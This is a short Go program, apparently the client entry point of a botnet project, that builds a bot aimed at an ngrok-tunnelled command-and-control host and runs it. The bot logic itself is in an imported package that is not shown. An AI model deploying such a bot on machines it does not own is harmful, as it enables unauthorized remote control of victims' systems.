package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("f57f4123.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
